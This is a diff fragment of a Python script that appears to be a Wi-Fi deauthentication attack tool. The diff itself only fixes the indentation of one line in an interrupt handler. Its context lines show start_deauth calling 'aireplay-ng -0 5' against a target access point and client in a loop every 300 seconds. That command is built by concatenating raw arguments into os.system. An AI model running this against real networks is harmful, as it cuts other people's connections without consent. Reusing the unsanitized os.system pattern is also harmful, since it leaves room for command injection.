@@ -44,7 +44,7 @@ def start_deauth(network_bssid, client_mac, network_interface):
             os.system('aireplay-ng -0 5 -a ' + network_bssid + ' -c ' + client_mac + ' ' + network_interface)
             sleep(300)
     except KeyboardInterrupt:
-	set_interface_down(network_interface)
+        set_interface_down(network_interface)
         exit()
 
 def set_interface_down(network_interface):
